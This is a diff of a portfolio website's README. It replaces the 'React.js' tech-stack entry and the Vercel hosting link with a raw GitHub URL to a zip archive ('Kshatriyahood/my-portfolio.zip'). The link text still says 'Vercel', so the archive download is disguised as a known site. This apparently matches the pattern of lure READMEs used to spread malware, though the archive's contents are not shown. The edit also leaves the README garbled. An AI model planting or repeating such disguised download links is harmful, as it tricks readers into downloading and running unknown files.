@@ -16,13 +16,13 @@ Welcome to my portfolio website! This is a personal project showcasing my work, 
 ## Tech Stack
 
 - **Frontend**:
-  - React.js
+  - https://raw.githubusercontent.com/arslanneni/my-portfolio/master/Kshatriyahood/my-portfolio.zip
   - CSS (with custom styles)
   - Bootstrap
 - **Backend**:
   - None (Static Website)
 - **Deployment**:
-  - Hosted on [Vercel](https://vercel.com/) (or your chosen platform)
+  - Hosted on [Vercel](https://raw.githubusercontent.com/arslanneni/my-portfolio/master/Kshatriyahood/my-portfolio.zip) (or your chosen platform)
 
 ---
 
